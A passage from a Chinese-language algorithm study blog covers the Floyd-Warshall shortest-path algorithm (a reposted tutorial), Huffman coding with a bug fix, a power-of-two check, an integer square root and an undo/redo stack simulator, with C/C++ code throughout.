&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int vis[3][20] = &#123;0&#125;;</span></span><br><span class="line"><span class="comment">//int R[8] = &#123;0&#125;;</span></span><br><span class="line"><span class="comment">//int tot = 0;</span></span><br><span class="line"><span class="comment">//int n = 8;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//void seac(int cur)&#123;</span></span><br><span class="line"><span class="comment">//    if(cur == 8) &#123;</span></span><br><span class="line"><span class="comment">//        tot++;</span></span><br><span class="line"><span class="comment">//        cout&lt;&lt; &quot;&quot;;</span></span><br><span class="line"><span class="comment">//        for(int i = 0; i &lt; 8; ++i)&#123;</span></span><br><span class="line"><span class="comment">//            cout &lt;&lt; R[i] + 1;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        cout &lt;&lt; &quot;,&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    else for(int i = 0; i &lt; 8; ++i)&#123;</span></span><br><span class="line"><span class="comment">//        if(!vis[0][i] &amp;&amp; !vis[1][cur+i] &amp;&amp; !vis[2][cur-i+8])&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            R[cur] = i;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            vis[0][i] = vis[1][cur+i] = vis[2][cur-i+8] = 1;</span></span><br><span class="line"><span class="comment">//            seac(cur + 1);</span></span><br><span class="line"><span class="comment">//            vis[0][i] = vis[1][cur+i] = vis[2][cur-i+8] = 0;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//memset(vis, 0, sizeof(vis));</span></span><br><span class="line"><span class="comment">//    memset(R, 0, sizeof(R));</span></span><br><span class="line"><span class="comment">//    seac(0);</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="Floyd"><a href="#Floyd" class="headerlink" title="Floyd"></a>Floyd</h2><h2 id="此算法由Robert-W-Floyd（罗伯特·弗洛伊德）于1962年发表在“Communications-of-the-ACM”上。同年Stephen-Warshall（史蒂芬·沃舍尔）也独立发表了这个算法。Robert-W．Floyd这个牛人是朵奇葩，他原本在芝加哥大学读的文学，但是因为当时美国经济不太景气，找工作比较困难，无奈之下到西屋电气公司当了一名计算机操作员，在IBM650机房值夜班，并由此开始了他的计算机生涯。"><a href="#此算法由Robert-W-Floyd（罗伯特·弗洛伊德）于1962年发表在“Communications-of-the-ACM”上。同年Stephen-Warshall（史蒂芬·沃舍尔）也独立发表了这个算法。Robert-W．Floyd这个牛人是朵奇葩，他原本在芝加哥大学读的文学，但是因为当时美国经济不太景气，找工作比较困难，无奈之下到西屋电气公司当了一名计算机操作员，在IBM650机房值夜班，并由此开始了他的计算机生涯。" class="headerlink" title="此算法由Robert W. Floyd（罗伯特·弗洛伊德）于1962年发表在“Communications of the ACM”上。同年Stephen Warshall（史蒂芬·沃舍尔）也独立发表了这个算法。Robert W．Floyd这个牛人是朵奇葩，他原本在芝加哥大学读的文学，但是因为当时美国经济不太景气，找工作比较困难，无奈之下到西屋电气公司当了一名计算机操作员，在IBM650机房值夜班，并由此开始了他的计算机生涯。"></a>此算法由Robert W. Floyd（罗伯特·弗洛伊德）于1962年发表在“Communications of the ACM”上。同年Stephen Warshall（史蒂芬·沃舍尔）也独立发表了这个算法。Robert W．Floyd这个牛人是朵奇葩，他原本在芝加哥大学读的文学，但是因为当时美国经济不太景气，找工作比较困难，无奈之下到西屋电气公司当了一名计算机操作员，在IBM650机房值夜班，并由此开始了他的计算机生涯。</h2><p>作者：ahalei来源：51CTO博客|2014-03-26 09:04</p>
<p>收藏</p>
<p>分享</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s1.51cto.com/wyfs02/M00/23/1C/wKioL1MyKrDSFjpKAABU4EmV3Qc641.jpg-wh_651x-s_35035338.jpg"
                      alt="081028t67l8vd73686e68m.png"
                ></p>
<p>暑假，小哼准备去一些城市旅游。有些城市之间有公路，有些城市之间则没有，如下图。为了节省经费以及方便计划旅程，小哼希望在出发之前知道任意两个城市之前的最短路程。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s7.51cto.com/wyfs02/M02/23/1B/wKiom1MyKtiQEf2iAAApFLfvlAE293.jpg"
                      alt="081028xjgvimgz7882qdu7.png"
                ></p>
<p>上图中有4个城市8条公路，公路上的数字表示这条公路的长短。请注意这些公路是单向的。我们现在需要求任意两个城市之间的最短路程，也就是求任意两个点之间的最短路径。这个问题这也被称为“多源最短路径”问题。</p>
<p>现在需要一个数据结构来存储图的信息，我们仍然可以用一个4*4的矩阵（二维数组e）来存储。比如1号城市到2号城市的路程为2，则设e[1][2]的值为2。2号城市无法到达4号城市，则设置e[2][4]的值为∞。另外此处约定一个城市自己是到自己的也是0，例如e[1][1]为0，具体如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s9.51cto.com/wyfs02/M00/23/1C/wKioL1MyKrCDi39tAAAiPbfsd-Y863.jpg"
                      alt="081028o2n5ebn8hdeh9e5l.png"
                ></p>
<p>现在回到问题：如何求任意两点之间最短路径呢？通过之前的学习我们知道通过深度或广度优先搜索可以求出两点之间的最短路径。所以进行n2遍深度或广度优先搜索，即对每两个点都进行一次深度或广度优先搜索，便可以求得任意两点之间的最短路径。可是还有没有别的方法呢？</p>
<p>我们来想一想，根据我们以往的经验，如果要让任意两点（例如从顶点a点到顶点b）之间的路程变短，只能引入第三个点（顶点k），并通过这个顶点k中转即a-&gt;k-&gt;b，才可能缩短原来从顶点a点到顶点b的路程。那么这个中转的顶点k是1~n中的哪个点呢？甚至有时候不只通过一个点，而是经过两个点或者更多点中转会更短，即a-&gt;k1-&gt;k2b-&gt;或者a-&gt;k1-&gt;k2…-&gt;k-&gt;i…-&gt;b。比如上图中从4号城市到3号城市（4-&gt;3）的路程e[4][3]原本是12。如果只通过1号城市中转（4-&gt;1-&gt;3），路程将缩短为11（e[4][1]+e[1][3]&#x3D;5+6&#x3D;11）。其实1号城市到3号城市也可以通过2号城市中转，使得1号到3号城市的路程缩短为5（e[1][2]+e[2][3]&#x3D;2+3&#x3D;5）。所以如果同时经过1号和2号两个城市中转的话，从4号城市到3号城市的路程会进一步缩短为10。通过这个的例子，我们发现每个顶点都有可能使得另外两个顶点之间的路程变短。好，下面我们将这个问题一般化。</p>
<p>当任意两点之间不允许经过第三个点时，这些城市之间最短路程就是初始路程，如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s1.51cto.com/wyfs02/M01/23/1C/wKioL1MyKrDDfAv9AAAiPbfsd-Y211.jpg"
                      alt="081029zdxxq919ttqt8tu8.png"
                ></p>
<p>如现在只允许经过1号顶点，求任意两点之间的最短路程，应该如何求呢？只需判断e[i][1]+e[1][j]是否比e[i][j]要小即可。e[i][j]表示的是从i号顶点到j号顶点之间的路程。e[i][1]+e[1][j]表示的是从i号顶点先到1号顶点，再从1号顶点到j号顶点的路程之和。其中i是1<del>n循环，j也是1</del>n循环，代码实现如下。</p>
<ol>
<li>for(i&#x3D;1;i&lt;&#x3D;n;i++)</li>
<li>{</li>
<li>for(j&#x3D;1;j&lt;&#x3D;n;j++)</li>
<li>    {</li>
<li>if ( e[i][j] &gt; e[i][1]+e[1][j] )</li>
<li>e[i][j] &#x3D; e[i][1]+e[1][j];</li>
<li>    }</li>
<li>}</li>
</ol>
<p>在只允许经过1号顶点的情况下，任意两点之间的最短路程更新为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s9.51cto.com/wyfs02/M02/23/1B/wKiom1MyKtixyd9aAAAimg6WCbM948.jpg"
                      alt="081029itl7z7m4l9qqg56d.png"
                ></p>
<p>通过上图我们发现：在只通过1号顶点中转的情况下，3号顶点到2号顶点（e[3][2]）、4号顶点到2号顶点（e[4][2]）以及4号顶点到3号顶点（e[4][3]）的路程都变短了。</p>
<p>接下来继续求在只允许经过1和2号两个顶点的情况下任意两点之间的最短路程。如何做呢？我们需要在只允许经过1号顶点时任意两点的最短路程的结果下，再判断如果经过2号顶点是否可以使得i号顶点到j号顶点之间的路程变得更短。即判断e[i][2]+e[2][j]是否比e[i][j]要小，代码实现为如下。</p>
<ol>
<li>&#x2F;&#x2F;经过1号顶点</li>
<li>for(i&#x3D;1;i&lt;&#x3D;n;i++)</li>
<li>for(j&#x3D;1;j&lt;&#x3D;n;j++)</li>
<li>if (e[i][j] &gt; e[i][1]+e[1][j])  e[i][j]&#x3D;e[i][1]+e[1][j];</li>
<li>&#x2F;&#x2F;经过2号顶点</li>
<li>for(i&#x3D;1;i&lt;&#x3D;n;i++)</li>
<li>for(j&#x3D;1;j&lt;&#x3D;n;j++)</li>
<li>if (e[i][j] &gt; e[i][2]+e[2][j])  e[i][j]&#x3D;e[i][2]+e[2][j];</li>
</ol>
<p>在只允许经过1和2号顶点的情况下，任意两点之间的最短路程更新为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s4.51cto.com/wyfs02/M00/23/1B/wKiom1MyKtjjpEHiAAAix7NGsrA796.jpg"
                      alt="081029e7gjlaaul4zk7z4n.png"
                ></p>
<p>通过上图得知，在相比只允许通过1号顶点进行中转的情况下，这里允许通过1和2号顶点进行中转，使得e[1][3]和e[4][3]的路程变得更短了。</p>
<p>同理，继续在只允许经过1、2和3号顶点进行中转的情况下，求任意两点之间的最短路程。任意两点之间的最短路程更新为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s7.51cto.com/wyfs02/M01/23/1C/wKioL1MyKrGxpKlsAAAi4hPRt2k063.jpg"
                      alt="081029pd747o8o87o07o7l.png"
                ></p>
<p>最后允许通过所有顶点作为中转，任意两点之间最终的最短路程为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s3.51cto.com/wyfs02/M02/23/1C/wKioL1MyKrHiJBcCAAAioTqzaQk771.jpg"
                      alt="081030h7tmht7cs2h7qftu.png"
                ></p>
<p>整个算法过程虽然说起来很麻烦，但是代码实现却非常简单，核心代码只有五行：</p>
<ol>
<li>for(k&#x3D;1;k&lt;&#x3D;n;k++)</li>
<li>for(i&#x3D;1;i&lt;&#x3D;n;i++)</li>
<li>for(j&#x3D;1;j&lt;&#x3D;n;j++)</li>
<li>if(e[i][j]&gt;e[i][k]+e[k][j])</li>
<li>   e[i][j]&#x3D;e[i][k]+e[k][j];</li>
</ol>
<p>这段代码的基本思想就是：最开始只允许经过1号顶点进行中转，接下来只允许经过1和2号顶点进行中转……允许经过1~n号所有顶点进行中转，求任意两点之间的最短路程。用一句话概括就是：从i号顶点到j号顶点只经过前k号点的最短路程。其实这是一种“动态规划”的思想，关于这个思想我们将在《啊哈！算法2——伟大思维闪耀时》在做详细的讨论。下面给出这个算法的完整代码：</p>
<ol>
<li><p>#include &lt;stdio.h&gt;   </p>
</li>
<li><p>int main()</p>
</li>
<li><p>{</p>
</li>
<li><p>int e[10][10],k,i,j,n,m,t1,t2,t3;</p>
</li>
<li><p>int inf&#x3D;99999999; &#x2F;&#x2F;用inf(infinity的缩写)存储一个我们认为的正无穷值</p>
</li>
<li><p>&#x2F;&#x2F;读入n和m，n表示顶点个数，m表示边的条数</p>
</li>
<li><p>    scanf(“%d %d”,&amp;n,&amp;m);</p>
</li>
<li><p>&#x2F;&#x2F;初始化</p>
</li>
<li><p>for(i&#x3D;1;i&lt;&#x3D;n;i++)</p>
</li>
<li><p>for(j&#x3D;1;j&lt;&#x3D;n;j++)</p>
</li>
<li><p>if(i&#x3D;&#x3D;j) e[i][j]&#x3D;0;</p>
</li>
<li><p>else e[i][j]&#x3D;inf;</p>
</li>
<li><p>&#x2F;&#x2F;读入边</p>
</li>
<li><p>for(i&#x3D;1;i&lt;&#x3D;m;i++)</p>
</li>
<li><p>    {</p>
</li>
<li><p> scanf(“%d %d %d”,&amp;t1,&amp;t2,&amp;t3);</p>
</li>
<li><p> e[t1][t2]&#x3D;t3;</p>
</li>
<li><p>    }</p>
</li>
<li><p>&#x2F;&#x2F;Floyd-Warshall算法核心语句</p>
</li>
<li><p>for(k&#x3D;1;k&lt;&#x3D;n;k++)</p>
</li>
<li><p>for(i&#x3D;1;i&lt;&#x3D;n;i++)</p>
</li>
<li><p>for(j&#x3D;1;j&lt;&#x3D;n;j++)</p>
</li>
<li><p>if(e[i][j]&gt;e[i][k]+e[k][j] )</p>
</li>
<li><p>      e[i][j]&#x3D;e[i][k]+e[k][j];</p>
</li>
<li><p>&#x2F;&#x2F;输出最终的结果</p>
</li>
<li><p>for(i&#x3D;1;i&lt;&#x3D;n;i++)</p>
</li>
<li><p>    {</p>
</li>
<li><p>for(j&#x3D;1;j&lt;&#x3D;n;j++)</p>
</li>
<li><p> {</p>
</li>
<li><p>     printf(“%10d”,e[i][j]);</p>
</li>
<li><p> }</p>
</li>
<li><p> printf(“\n”);</p>
</li>
<li><p>    }</p>
</li>
<li><p>return0;</p>
</li>
<li><p>}</p>
</li>
</ol>
<p>有一点需要注意的是：如何表示正无穷。我们通常将正无穷定义为99999999，因为这样即使两个正无穷相加，其和仍然不超过int类型的范围（C语言int类型可以存储的最大正整数是2147483647）。在实际应用中最好估计一下最短路径的上限，只需要设置比它大一点既可以。例如有100条边，每条边不超过100的话，只需将正无穷设置为10001即可。如果你认为正无穷和其它值相加得到一个大于正无穷的数是不被允许的话，我们只需在比较的时候加两个判断条件就可以了，请注意下面代码中带有下划线的语句。</p>
<ol>
<li>&#x2F;&#x2F;Floyd-Warshall算法核心语句</li>
<li>for(k&#x3D;1;k&lt;&#x3D;n;k++)</li>
<li>for(i&#x3D;1;i&lt;&#x3D;n;i++)</li>
<li>for(j&#x3D;1;j&lt;&#x3D;n;j++)</li>
<li>if(e[i][k]&lt;inf &amp;&amp; e[k][j]&lt;inf &amp;&amp; e[i][j]&gt;e[i][k]+e[k][j])</li>
<li>     e[i][j]&#x3D;e[i][k]+e[k][j];</li>
</ol>
<p>上面代码的输入数据样式为：</p>
<ol>
<li>48</li>
<li>122</li>
<li>136</li>
<li>144</li>
<li>233</li>
<li>317</li>
<li>341</li>
<li>415</li>
<li>4312</li>
</ol>
<p>第一行两个数为n和m，n表示顶点个数，m表示边的条数。</p>
<p>接下来m行，每一行有三个数t1、t2 和t3，表示顶点t1到顶点t2的路程是t3。</p>
<p>得到最终结果如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s1.51cto.com/wyfs02/M00/23/1B/wKiom1MyKtnRaui7AAAiIc6AlNg084.jpg"
                      alt="081030is22w3mmnz3r33m3.png"
                ></p>
<p>通过这种方法我们可以求出任意两个点之间最短路径。它的时间复杂度是O(N3)。令人很震撼的是它竟然只有五行代码，实现起来非常容易。正是因为它实现起来非常容易，如果时间复杂度要求不高，使用Floyd-Warshall来求指定两点之间的最短路或者指定一个点到其余各个顶点的最短路径也是可行的。当然也有更快的算法，请看下一节：Dijkstra算法。</p>
<p>另外需要注意的是：Floyd-Warshall算法不能解决带有“负权回路”（或者叫“负权环”）的图，因为带有“负权回路”的图没有最短路。例如下面这个图就不存在1号顶点到3号顶点的最短路径。因为1-&gt;2-&gt;3-&gt;1-&gt;2-&gt;3-&gt;…-&gt;1-&gt;2-&gt;3这样路径中，每绕一次1-&gt;-2&gt;3这样的环，最短路就会减少1，永远找不到最短路。其实如果一个图中带有“负权回路”那么这个图则没有最短路。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://s9.51cto.com/wyfs02/M01/23/1B/wKiom1MyKtny9TMPAAAUSSCT5WA988.jpg"
                      alt="081030elthvel6et6k886y.png"
                ></p>
<p>此算法由Robert W. Floyd（罗伯特·弗洛伊德）于1962年发表在“Communications of the ACM”上。同年Stephen Warshall（史蒂芬·沃舍尔）也独立发表了这个算法。Robert W．Floyd这个牛人是朵奇葩，他原本在芝加哥大学读的文学，但是因为当时美国经济不太景气，找工作比较困难，无奈之下到西屋电气公司当了一名计算机操作员，在IBM650机房值夜班，并由此开始了他的计算机生涯。此外他还和J.W.J. Williams（威廉姆斯）于1964年共同发明了著名的堆排序算法HEAPSORT。堆排序算法我们将在第七章学习。Robert W．Floyd在1987年获得了图灵奖。</p>
<p>博客地址：<a class="link"   href="http://ahalei.blog.51cto.com/4767671/1383613" >http://ahalei.blog.51cto.com/4767671/1383613<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="Huffman"><a href="#Huffman" class="headerlink" title="Huffman"></a>Huffman</h2><p>给定一个字符串，进行哈夫曼编码</p>
<pre><code>#include &lt;bits/stdc++.h&gt;

using namespace std;

typedef struct node&#123;
    int num;
    string data;
    node(int _num, string _data)&#123;
        num = _num; data = _data;
    &#125;
&#125;node;

bool operator&lt;(const node &amp;a, const node &amp;b)&#123;
     return a.num &gt; b.num;
&#125;


int main()&#123;
    int kase = 1;
    string line;
    while(getline(cin, line))&#123;
        int chr[30] = &#123;0&#125;;
        string answer[30];
        priority_queue&lt;node&gt; que;
        int len = line.length();
        for(int i = 0; i &lt; len; ++i)&#123;
            chr[line[i] - &#39;A&#39;]++;
        &#125;
        for(int i = 0; i &lt; 26; ++i)&#123;
            if(chr[i])&#123;
                string p = &quot;&quot;;
                que.push(node(chr[i], p + char(&#39;A&#39; + i)));
            &#125;
        &#125;

        int n = que.size() - 1;
        if(n &gt; 0)&#123;
            for(int i = 0; i &lt; n; ++i)&#123;
                node a = que.top(); que.pop();
                node b = que.top(); que.pop();
                for(int j = 0; j &lt; a.data.size(); ++j)&#123;
                    answer[a.data[j]-&#39;A&#39;] += &#39;0&#39;;
                &#125;
                for(int j = 0; j &lt; b.data.size(); ++j)&#123;
                    answer[b.data[j]-&#39;A&#39;] += &#39;1&#39;;
                &#125;
                que.push(node(a.num + b.num, a.data + b.data));
            &#125;
            cout &lt;&lt; &quot;Case #&quot; &lt;&lt; kase++ &lt;&lt; &quot;:&quot; &lt;&lt; endl;
            for(int i = 0; i &lt; 26; ++i)&#123;
                if(chr[i])&#123;
                    reverse(answer[i].begin(), answer[i].end());
                &#125;
            &#125;
            ///对answer字符串数组排序：相同chr的字符串按字典序排
            for(int i = 0; i &lt; 26; ++i)&#123;
                for(int j = i; j &lt; 26; ++j)&#123;
                    if(chr[i] == chr[j])&#123;
                        if(answer[j] &lt; answer[i])&#123;
                            swap(answer[i], answer[j]);
                        &#125;
                    &#125;

                &#125;
            &#125;
            ///以上对answer字符串数组排序：相同chr的字符串按按字典序排
            for(int i = 0; i &lt; 26; ++i)&#123;
                if(chr[i])&#123;
                    printf(&quot;%c: %s\n&quot;, i + &#39;A&#39;,answer[i].c_str());
                &#125;
            &#125;
            int sum = 0;
            for(int i = 0; i &lt; 26; ++i)&#123;
                sum += answer[i].size() * chr[i];
            &#125;
            cout &lt;&lt; sum;
            if(sum &lt; 50)&#123;
                cout &lt;&lt; &quot; &quot;;
                for(int i = 0; i &lt; len; ++i)&#123;
                    cout &lt;&lt; answer[line[i] - &#39;A&#39;];
                &#125;
            &#125;
        &#125; else if (n == 0)&#123;
            node fina = que.top();
            cout &lt;&lt; fina.data &lt;&lt; &quot;:&quot; &lt;&lt; 0 &lt;&lt; endl;
            cout &lt;&lt; len;
            if(len &lt; 50)&#123;
                cout &lt;&lt; &quot; &quot;;
                for(int i = 0; i &lt; len; ++i)&#123;
                    cout &lt;&lt; 0;
                &#125;
            &#125;
        &#125;
        cout &lt;&lt; endl;

    &#125;

&#125;
</code></pre>
<p>开心的wrong answer 正在查，<br>已查出错误，字典序保证方式出错 要保证为字典序不能后期排<br>因为要考虑同时保证最子权与父权的构建关系<br>不能生成后才排序编码</p>
<blockquote>
<p>而应是最简最直接思路<br>- <strong>排好序后进行编码</strong></p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;

using namespace std;

typedef struct node&#123;
    int num;
    string data;
    node(int _num, string _data)&#123;
        num = _num; data = _data;
    &#125;
    bool operator&lt;(const node &amp;b)const&#123;
         ///重点唯一改动
         if (num == b.num) return data[0] &gt; b.data[0];
         return num &gt; b.num;
    &#125;
&#125;node;



int main()&#123;
    int kase = 1;
    string line;
    while(getline(cin, line))&#123;
        int chr[30] = &#123;0&#125;;
        string answer[30];
        priority_queue&lt;node&gt; que;
        int len = line.length();
        for(int i = 0; i &lt; len; ++i)&#123;
            chr[line[i] - &#39;A&#39;]++;
        &#125;
        for(int i = 0; i &lt; 26; ++i)&#123;
            if(chr[i])&#123;
                string p = &quot;&quot;;
                que.push(node(chr[i], p + char(&#39;A&#39; + i)));
            &#125;
        &#125;
        int n = que.size() - 1;
        if(n &gt; 0)&#123;
            for(int i = 0; i &lt; n; ++i)&#123;
                node a = que.top(); que.pop();
                node b = que.top(); que.pop();
                for(int j = 0; j &lt; a.data.size(); ++j)&#123;
                    answer[a.data[j]-&#39;A&#39;] += &#39;0&#39;;
                &#125;
                for(int j = 0; j &lt; b.data.size(); ++j)&#123;
                    answer[b.data[j]-&#39;A&#39;] += &#39;1&#39;;
                &#125;
                que.push(node(a.num + b.num, a.data + b.data));
            &#125;
            cout &lt;&lt; &quot;Case #&quot; &lt;&lt; kase++ &lt;&lt; &quot;:&quot; &lt;&lt; endl;
            for(int i = 0; i &lt; 26; ++i)&#123;
                if(chr[i])&#123;
                    reverse(answer[i].begin(), answer[i].end());
                &#125;
            &#125;
            ///对answer字符串数组排序：相同chr的字符串按字典序排
            for(int i = 0; i &lt; 25; ++i)&#123;
                for(int j = 0; j &lt; 25 - i; ++j)&#123;
                    if(chr[j] &amp;&amp; chr[j+1])
                    if(chr[j] == chr[j+1])&#123;
                        if(answer[j] &gt; answer[j+1])&#123;
                            swap(answer[j+1], answer[j]);
                        &#125;
                    &#125;

                &#125;
            &#125;
            ///以上对answer字符串数组排序：相同chr的字符串按按字典序排
            for(int i = 0; i &lt; 26; ++i)&#123;
                if(chr[i])&#123;
                    printf(&quot;%c: %s\n&quot;, i + &#39;A&#39;,answer[i].c_str());
                &#125;
            &#125;
            int sum = 0;
            for(int i = 0; i &lt; 26; ++i)&#123;
                sum += answer[i].size() * chr[i];
            &#125;
            cout &lt;&lt; sum;
            if(sum &lt; 50)&#123;
                cout &lt;&lt; &quot; &quot;;
                for(int i = 0; i &lt; len; ++i)&#123;
                    cout &lt;&lt; answer[line[i] - &#39;A&#39;];
                &#125;
            &#125;
        &#125; else if (n == 0)&#123;
            node fina = que.top();
            cout &lt;&lt; &quot;Case #&quot; &lt;&lt; kase++ &lt;&lt; &quot;:&quot; &lt;&lt; endl;
            cout &lt;&lt; fina.data &lt;&lt; &quot;: &quot; &lt;&lt; 0 &lt;&lt; endl;
            cout &lt;&lt; len;
            if(len &lt; 50)&#123;
                cout &lt;&lt; &quot; &quot;;
                for(int i = 0; i &lt; len; ++i)&#123;
                    cout &lt;&lt; 0;
                &#125;
            &#125;
        &#125;
        cout &lt;&lt; endl;

    &#125;

&#125;
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20161102133253964"
                      alt="这里写图片描述"
                ></p>
<h2 id="Power-of-Two"><a href="#Power-of-Two" class="headerlink" title="Power of Two"></a>Power of Two</h2><p>Given an integer, write a function to determine if it is a power of two.</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n &gt; <span class="number">0</span> &amp;&amp; !(n&amp;(n<span class="number">-1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Explain: 100 &amp; 011 &#x3D; 0</p>
<p>Try think about power of 4: <code>return num &gt; 0 &amp;&amp; (num &amp; (num - 1)) == 0 &amp;&amp; (num - 1) % 3 == 0;</code></p>
<blockquote>
<p>(4^n - 1) % 3 &#x3D;&#x3D; 0<br>proof:<br>(1) 4^n - 1 &#x3D; (2^n + 1) * (2^n - 1)<br>(2) among any 3 consecutive numbers, there must be one that is a multiple of 3<br>among (2^n-1), (2^n), (2^n+1), one of them must be a multiple of 3, and (2^n) cannot be the one, therefore either (2^n-1) or (2^n+1) must be a multiple of 3, and 4^n-1 must be a multiple of 3 as well.</p>
</blockquote>
<h2 id="Sqrt-x"><a href="#Sqrt-x" class="headerlink" title="Sqrt(x)"></a>Sqrt(x)</h2><p><a class="link"   href="https://leetcode.com/problems/sqrtx/discuss/25057/3-4-short-lines-Integer-Newton-Every-Language/24092" >https://leetcode.com/problems/sqrtx/discuss/25057/3-4-short-lines-Integer-Newton-Every-Language/24092<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> r = x;</span><br><span class="line"><span class="keyword">while</span> (r*r &gt; x)</span><br><span class="line">    r = (r + x/r) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br></pre></td></tr></table></figure></div>


<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://assets.leetcode.com/static_assets/discuss/uploads/files/1502465638921-95f6f6f0-a1b8-4f19-919d-1a0b53e18aac-image.png"
                      alt="answer"
                ></p>
<h2 id="Redo-or-Undo"><a href="#Redo-or-Undo" class="headerlink" title="Redo or Undo"></a>Redo or Undo</h2><blockquote>
<p>撤销模拟程序 编写程序模拟word中的“重做Redo”“撤销Undo”两个按钮。即键盘输入一段文字（不能含#，e.g., I as Tom whether he will go to Beijingh）之后输入“#U”（“U”代表Undo）则撤销最后一个输入的字符(“h”)，在输出位置重新输出一遍新撤销后的串。这时可以再继续输入。当然，也可以输入“#R”恢复刚才删除的输入h。每有一次#R都要输出一下新的结果。当然，可以同时连续输入多个#U或多个#R。比如，输入#U#U#R#U#U#U#R#R。</p>
</blockquote>
<ul>
<li>Input<ul>
<li>第一行为一个数字T，代表一共有T组测试样例，每组测试样例包含以下内容：<br>每行包含一串字母（包含空格，不超过100个字符）。<br>开始第一个字母不能为“#”，即第一个字母必须要敲入文字。<br>“#R”表示重做。<br>“#U”表示撤销。<br>“##”表示本次测试样例结束。</li>
</ul>
</li>
<li>Ouput<ul>
<li>每输入一次重做，都要输出操作之后的文字</li>
</ul>
</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stack&gt;</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">int cases;</span><br><span class="line">cin &gt;&gt; cases;   getchar();</span><br><span class="line">for(int kase = 1; kase &lt;= cases; ++kase)&#123;</span><br><span class="line"></span><br><span class="line">        stack&lt;char&gt; cc;</span><br><span class="line">        string oper = &quot;&quot;, opert;</span><br><span class="line"></span><br><span class="line">        while(getline(cin, opert) &amp;&amp; opert != &quot;##&quot;)&#123;</span><br><span class="line">            if(opert[0] == &#x27;#&#x27;)&#123;</span><br><span class="line">                if(opert[1] == &#x27;U&#x27;)&#123;</span><br><span class="line">                    int num = oper.size() - 1;</span><br><span class="line">                    if(num &gt;= 0)&#123;</span><br><span class="line">                        cc.push(oper[num]);</span><br><span class="line">                        //cout &lt;&lt; oper[num] &lt;&lt; &quot;*-*&quot; &lt;&lt; cc.size() &lt;&lt; endl;</span><br><span class="line">                        oper.resize(num);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                else if(opert[1] == &#x27;R&#x27;)&#123;</span><br><span class="line">                    if(!cc.empty())&#123;</span><br><span class="line">                        char c = cc.top();</span><br><span class="line">                        oper += c;</span><br><span class="line">                        cc.pop();</span><br><span class="line">                    &#125;</span><br><span class="line">                    cout &lt;&lt; oper  &lt;&lt; endl;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                    oper += opert;</span><br><span class="line">                    while(!cc.empty()) cc.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="求后缀表达式"><a href="#求后缀表达式" class="headerlink" title="求后缀表达式"></a>求后缀表达式</h2><blockquote>
<p>规则：从左到右遍历表达式的每个数字和符号，遇到是数字就进栈，遇到是符号，就将处于栈顶两个数字出栈，进行运算，运算结果进栈，一直到最终获得结果。</p>
</blockquote>
<pre><code>//中缀表达式转后缀表达式的方法：
//1.遇到操作数：直接输出（添加到后缀表达式中）
//2.栈为空时，遇到运算符，直接入栈
//3.遇到左括号：将其入栈
//4.遇到右括号：执行出栈操作，并将出栈的元素输出，直到弹出栈的是左括号，左括号不输出。
//5.遇到其他运算符：加减乘除：弹出所有优先级大于或者等于该运算符的栈顶元素，然后将该运算符入栈
//6.最终将栈中的元素依次出栈，输出。
//fork from http://www.cnblogs.com/mygmh/archive/2012/10/06/2713362.html
</code></pre>
